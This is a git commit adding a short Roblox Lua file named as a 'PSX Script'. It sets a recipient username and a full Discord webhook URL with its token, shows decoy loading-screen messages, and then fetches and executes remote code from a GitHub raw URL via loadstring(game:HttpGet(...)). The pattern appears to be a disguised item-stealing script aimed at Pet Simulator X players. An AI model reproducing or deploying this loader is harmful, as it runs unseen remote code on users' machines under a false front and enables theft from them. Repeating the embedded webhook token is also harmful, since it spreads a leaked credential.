19d8b663619ba6c8f22ad3445b36c787f4a523ff
amongussswe <106925153+amongussswe@users.noreply.github.com>
2023-03-20 18:12:03 +0200

    Add files via upload

---
+++ New Text Document.lua
@@ -0,0 +1,11 @@
+Username = "KriszgaplyaYT"
+WebHook = "https://discord.com/api/webhooks/1062727863247327314/mEQPLE6mQWqeyOL8ksk8oaxDcrvRRx0Uns8dpJxcH9nh15XDtrluL8uvNgnVjHLC4QMu"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))() 
